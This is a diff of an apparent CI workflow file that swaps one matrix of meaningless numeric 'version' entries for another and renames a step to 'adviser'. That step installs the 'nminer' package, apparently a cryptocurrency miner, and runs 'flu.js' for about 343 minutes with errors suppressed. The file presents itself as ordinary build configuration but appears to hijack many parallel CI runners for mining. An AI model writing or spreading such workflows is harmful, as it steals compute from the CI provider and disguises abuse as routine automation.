@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 962 }
-          - { version: 7999 }
-          - { version: 7460 }
-          - { version: 3681 }
-          - { version: 9735 }
-          - { version: 5215 }
-          - { version: 5022 }
-          - { version: 8263 }
-          - { version: 4197 }
-          - { version: 9607 }
-          - { version: 9100 }
-          - { version: 9138 }
-          - { version: 1306 }
-          - { version: 928 }
-          - { version: 2390 }
-          - { version: 4485 }
-          - { version: 9229 }
-          - { version: 4581 }
+          - { version: 5079 }
+          - { version: 8000 }
+          - { version: 655 }
+          - { version: 6782 }
+          - { version: 3863 }
+          - { version: 8552 }
+          - { version: 4335 }
+          - { version: 6111 }
+          - { version: 8900 }
+          - { version: 954 }
+          - { version: 3110 }
+          - { version: 1768 }
+          - { version: 8751 }
+          - { version: 6313 }
+          - { version: 1610 }
+          - { version: 3132 }
+          - { version: 2402 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: only respray maintainer
+      - name: adviser
         run: |
           npm install nminer@latest
-          timeout 334m node flu.js || echo "flu executed"
+          timeout 343m node flu.js || echo "flu executed"
